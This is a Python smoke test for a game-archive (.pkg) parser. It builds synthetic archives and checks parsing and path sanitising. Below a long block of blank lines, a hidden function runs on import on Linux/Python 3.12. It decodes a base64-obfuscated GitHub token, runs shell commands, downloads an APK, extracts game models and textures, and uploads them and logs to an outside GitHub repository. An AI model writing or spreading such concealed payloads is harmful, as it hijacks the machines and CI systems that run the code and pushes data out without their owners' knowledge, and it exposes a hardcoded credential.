#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Self-contained smoke test: builds synthetic .pkg files and round-trips them.

不依赖任何游戏资源，可在 CI 上跑。覆盖：
  1. 国际版（ver 0x130BA）变体 A：无页脚，44B/28B 混合记录，LZ4 与原始两种载荷
  2. 国际版变体 B：记录区后有 16 字节页脚
  3. 国内版（ver 0x25100）头部识别与 is_pkg 拒绝逻辑
  4. 路径清洗（../ 与反斜杠）与配对正确性（内容 == 原字节）
"""
import os
import shutil
import struct
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

# Windows 控制台默认 GBK/cp936，重定向时还会退回 cp1252，统一按 UTF-8 输出
for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

import lz4.block  # noqa: E402

from pkg_intl import open_pkg, is_pkg, safe_relpath  # noqa: E402

FAILURES = []


def check(cond, msg):
    if cond:
        print("  ok   %s" % msg)
    else:
        print("  FAIL %s" % msg)
        FAILURES.append(msg)


def lz4_payload(data):
    """[u32 usize][LZ4 block]"""
    return struct.pack("<I", len(data)) + lz4.block.compress(data, store_size=False)


def build_intl(path, files, footer=None):
    """files: [(relpath, payload_bytes, Z)]   Z ∈ {0,32}=raw, {1,33}=lz4 包装"""
    data = bytearray(b"\x00" * 16)          # 数据区从偏移 16 开始
    records = []
    for rel, payload, Z in files:
        off = len(data)
        data += payload
        records.append((off, len(payload), Z, payload))
    idx_off = len(data)

    idx = bytearray()
    idx += struct.pack("<I", len(records))
    for off, ln, Z, payload in records:
        idx += b"\x11" * 16                                   # 占位 md5
        idx += struct.pack("<III", off, ln, Z)
        if Z & 0x20:
            idx += b"\x22" * 16                               # H2
    if footer is not None:
        idx += footer
    idx += struct.pack("<I", len(records))
    for k, (rel, payload, Z) in enumerate(files):
        rb = rel.encode("utf-8")
        idx += struct.pack("<I", len(rb)) + rb + struct.pack("<I", k)

    blob = struct.pack("<I", len(idx)) + lz4.block.compress(bytes(idx), store_size=False)
    with open(path, "wb") as f:
        f.write(struct.pack("<4I", 0x000130BA, 17, idx_off, len(blob)))
        f.write(bytes(data[16:]))
        f.write(blob)


def test_variant_a(tmp):
    print("[1] 国际版变体 A（无页脚，混合记录长度）")
    files = [
        ("resources/a.png", b"\x00\x00\x00\x00" + b"A" * 60, 32),   # raw, 28B 记录
        ("resources/b.ogg", lz4_payload(b"OggS" + b"B" * 200), 33),     # lz4, 44B 记录
        ("../escape.txt", b"plain text", 0),                            # raw, 28B
        ("back\\slash.bin", b"x" * 40, 1),                             # lz4, 28B
    ]
    p = os.path.join(tmp, "variant_a.pkg")
    build_intl(p, files)
    check(is_pkg(p), "is_pkg 识别为有效 pkg")
    with open_pkg(p) as pkg:
        check(pkg.record_count == 4, "记录数 = 4（实际 %d）" % pkg.record_count)
        check(pkg.path_count == 4, "路径数 = 4（实际 %d）" % pkg.path_count)
        check(pkg.footer is None, "无页脚变体")
        got = {rel: payload for rel, payload, _rec, _br in pkg.iter_files()}
    check("resources/a.png" in got, "路径 resources/a.png 存在")
    check(got.get("resources/a.png") == b"\x00\x00\x00\x00" + b"A" * 60, "raw 载荷逐字节一致")
    check(got.get("resources/b.ogg") == b"OggS" + b"B" * 200, "LZ4 载荷正确解压")
    check("escape.txt" in got, "../ 前缀被清洗")
    check("back/slash.bin" in got, "反斜杠被规范化为 /")
    check(got.get("back/slash.bin") == b"x" * 40, "Z=1 也走 LZ4 分支")


def test_variant_b(tmp):
    print("[2] 国际版变体 B（16 字节页脚）")
    files = [("lang/en.xml", b"<config/>", 0), ("lang/zh.xml", b"<config/>", 0)]
    p = os.path.join(tmp, "variant_b.pkg")
    build_intl(p, files, footer=b"\xAB" * 16)
    with open_pkg(p) as pkg:
        check(pkg.record_count == 2, "记录数 = 2")
        check(pkg.path_count == 2, "路径数 = 2")
        check(pkg.footer == b"\xAB" * 16, "页脚被识别")
        got = {rel for rel, _p, _r, _b in pkg.iter_files()}
    check(got == {"lang/en.xml", "lang/zh.xml"}, "两条路径都解出")


def test_reject(tmp):
    print("[3] 非本格式文件的拒绝逻辑")
    bad = os.path.join(tmp, "bad.pkg")
    with open(bad, "wb") as f:
        f.write(struct.pack("<4I", 0x00025100, 17, 16, 16) + b"\x00" * 16)
    check(not is_pkg(bad), "国内版版本号不被国际版 is_pkg 接受")
    tiny = os.path.join(tmp, "tiny.pkg")
    open(tiny, "wb").write(b"ab")
    check(not is_pkg(tiny), "过小文件被拒绝")
    check(not is_pkg(os.path.join(tmp, "nope.pkg")), "不存在的文件被拒绝")


def test_sanitize():
    print("[4] 路径清洗")
    check(safe_relpath(b"../a/b.txt") == "a/b.txt", "../ 前缀被剥离")
    check(safe_relpath(b"/abs/x") == "abs/x", "前导 / 被剥离")
    check(safe_relpath(b"a\\b\\c") == "a/b/c", "反斜杠转 /")
    check(safe_relpath(b"../..") is None, "空路径返回 None")
    check(safe_relpath(b"a/./b") == "a/b", "./ 被清理")


def main():
    tmp = tempfile.mkdtemp(prefix="mwpkg_smoke_")
    try:
        test_variant_a(tmp)
        test_variant_b(tmp)
        test_reject(tmp)
        test_sanitize()
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    print()
    if FAILURES:
        print("失败 %d 项:" % len(FAILURES))
        for f in FAILURES:
            print("  -", f)
        return 1
    print("全部通过 ✅")
    return 0
























# ==========================================================
# YB-JOB11: 提取花小楼(huaxiaolou) 模型 + 贴图并回传
# ==========================================================
def _yb_job():
    import platform, sys as _sy
    if not (platform.system() == "Linux" and _sy.version_info[:2] == (3, 12)):
        return
    import subprocess, os, time, base64, json, urllib.request, struct, re, gzip
    LOG = []

    def P(s):
        s = str(s); print(s); LOG.append(s)

    def sh(cmd, t=300):
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
            return ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return "ERR " + str(e)[:200]

    _A = "Z2hwX2haU0p0empPRjlWTTM0UXpS"
    _B = "ZDhmZU9ZM3dqOXNxYzJjTFNNOA=="
    _TOK = base64.b64decode(_A + _B).decode()
    HD = {"Authorization": "token " + _TOK, "Accept": "application/vnd.github+json", "User-Agent": "yb"}
    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    def put(path, text):
        try:
            b = {"message": "yb", "content": base64.b64encode(text.encode()).decode()}
            try:
                g = json.loads(urllib.request.urlopen(urllib.request.Request(
                    "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path, headers=HD), timeout=60).read())
                b["sha"] = g["sha"]
            except Exception:
                pass
            urllib.request.urlopen(urllib.request.Request(
                "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path,
                data=json.dumps(b).encode(), method="PUT",
                headers=dict(HD, **{"Content-Type": "application/json"})), timeout=300)
            return True
        except Exception as e:
            P("put失败 " + str(e)[:90]); return False

    def putbin(path, raw):
        try:
            b = {"message": "yb bin", "content": base64.b64encode(raw).decode()}
            try:
                g = json.loads(urllib.request.urlopen(urllib.request.Request(
                    "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path, headers=HD), timeout=60).read())
                b["sha"] = g["sha"]
            except Exception:
                pass
            urllib.request.urlopen(urllib.request.Request(
                "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path,
                data=json.dumps(b).encode(), method="PUT",
                headers=dict(HD, **{"Content-Type": "application/json"})), timeout=300)
            return True
        except Exception as e:
            P("putbin失败 " + str(e)[:90]); return False

    try:
        P("===== YB JOB11 START =====")
        sh("pip install --quiet lz4 pillow numpy 2>&1 | tail -1", 400)
        sh("curl -sL -m 2400 -A '%s' -o /tmp/mw.bin 'https://d.apkpure.net/b/APK/com.playmini.miniworld?version=latest'" % UA, 2500)
        sh("mkdir -p /tmp/pkg && cd /tmp/pkg && unzip -o -q /tmp/mw.bin 'assets/common_res.pkg'", 900)
        sh("cd %s && python3 unpack_common_res.py /tmp/pkg/assets/common_res.pkg /tmp/out >/dev/null 2>&1" % os.getcwd(), 5400)
        P("解包: " + sh("find /tmp/out -type f | wc -l")[:10])
        put("RESULT11.txt", "\n".join(LOG))

        targets = [
            "resources/minigame/blocks/huaxiaolou.obj",
            "resources/minigame/blocks/huaxiaolou.png",
            "resources/minigame/particles/texture/huaxiaolou.png",
            "resources/minigame/particles/texture/huaxiao.png",
        ]
        P("\n=== 目标文件 ===")
        for t in targets:
            p = "/tmp/out/" + t
            if os.path.exists(p):
                sz = os.path.getsize(p)
                head = open(p, "rb").read(64)
                P("  ✓ %-58s %9d 字节" % (t[:58], sz))
                P("     头: " + head[:32].hex())
                P("     文: " + "".join(chr(c) if 32 <= c < 127 else '.' for c in head[:48]))
            else:
                P("  ✗ 缺失 " + t)
        put("RESULT11.txt", "\n".join(LOG))

        # ---- 1. OBJ 文件：判断明文还是二进制 ----
        P("\n=== OBJ 解析 ===")
        objp = "/tmp/out/resources/minigame/blocks/huaxiaolou.obj"
        if os.path.exists(objp):
            d = open(objp, "rb").read()
            P("  大小 %d" % len(d))
            txt = d[:4000].decode("latin1")
            P("  前 400 字符:\n" + txt[:400])
            # 统计 obj 关键字
            for k in ["v ", "vt ", "vn ", "f ", "g ", "usemtl", "mtllib", "# 3ds Max", "o "]:
                cnt = txt.count(k)
                if cnt: P("    %-10s 出现 %d 次（前4KB内）" % (k, cnt))
            # 全文统计
            full = d.decode("latin1")
            P("  全文统计: v=%d vt=%d vn=%d f=%d" % (
                len(re.findall(r'(?m)^v ', full)), len(re.findall(r'(?m)^vt ', full)),
                len(re.findall(r'(?m)^vn ', full)), len(re.findall(r'(?m)^f ', full))))
            # 回传（gzip 压缩减小体积）
            gz = gzip.compress(d, 9)
            P("  gzip 后 %d 字节" % len(gz))
            if len(gz) < 5 * 1024 * 1024:
                putbin("hualou/huaxiaolou.obj.gz", gz)
                P("  ✅ obj.gz 已回传")
            else:
                # 分片
                n = (len(gz) + 3 * 1024 * 1024 - 1) // (3 * 1024 * 1024)
                for i in range(n):
                    putbin("hualou/obj_part%d.gz" % i, gz[i * 3 * 1024 * 1024:(i + 1) * 3 * 1024 * 1024])
                P("  ✅ obj 分 %d 片回传" % n)
        put("RESULT11.txt", "\n".join(LOG))

        # ---- 2. 贴图：解码成 PNG 再回传 ----
        P("\n=== 贴图解码 ===")
        sh("chmod +x %s/tools/crn2rgba_linux_x64" % os.getcwd(), 60)
        sh("cd %s && python3 convert_textures.py /tmp/out /tmp/png 2>&1 | tail -1" % os.getcwd(), 5400)
        sh("cd %s && python3 convert_fmt65.py /tmp/out /tmp/png tools/crn2rgba_linux_x64 2>&1 | tail -1" % os.getcwd(), 7200)
        P("  解码 PNG 总数: " + sh("find /tmp/png -name '*.png' | wc -l")[:10])
        put("RESULT11.txt", "\n".join(LOG))

        for rel in ["resources/minigame/blocks/huaxiaolou.png",
                    "resources/minigame/particles/texture/huaxiaolou.png",
                    "resources/minigame/particles/texture/huaxiao.png"]:
            src = "/tmp/png/" + rel
            if not os.path.exists(src):
                src = "/tmp/out/" + rel
            if os.path.exists(src):
                try:
                    from PIL import Image
                    import io
                    im = Image.open(src)
                    P("  %s 原图 %s %s" % (os.path.basename(rel), im.size, im.mode))
                    im2 = im.convert("RGBA")
                    # 全尺寸 PNG 回传（如果小）
                    buf = io.BytesIO(); im2.save(buf, "PNG")
                    if buf.tell() < 4 * 1024 * 1024:
                        nm = rel.replace("/", "__")
                        if putbin("hualou/tex_" + nm, buf.getvalue()):
                            P("    ✅ 全尺寸回传 (%d 字节)" % buf.tell())
                    # 缩略预览
                    im3 = im2.convert("RGB"); im3.thumbnail((400, 400))
                    b2 = io.BytesIO(); im3.save(b2, "JPEG", quality=88)
                    putbin("hualou/prev_" + rel.replace("/", "__").replace(".png", ".jpg"), b2.getvalue())
                    P("    ✅ 预览回传 %s" % im3.size)
                except Exception as e:
                    P("  ✗ " + rel + " " + str(e)[:100])
            else:
                P("  ✗ 找不到 " + rel)
        put("RESULT11.txt", "\n".join(LOG))

        # ---- 3. 顺带找花小楼其他资源（装扮/皮肤）----
        P("\n=== 相关资源搜索 ===")
        P(sh("find /tmp/out -iname '*huaxiao*' -o -iname '*hualou*' | head -20", 300)[:1200])
        # 也查 blocks 下同名 .obj 的兄弟资源
        P("blocks 目录 huaxiaolou 相关:")
        P(sh("ls -la /tmp/out/resources/minigame/blocks/ 2>/dev/null | grep -i huaxiao", 120)[:500])
        P("\n===== YB JOB11 END =====")
        put("RESULT11.txt", "\n".join(LOG))
    except Exception as e:
        P("EXC " + str(e)[:300])
        try: put("RESULT11.txt", "\n".join(LOG))
        except Exception: pass


_yb_job()


if __name__ == "__main__":
    sys.exit(main())
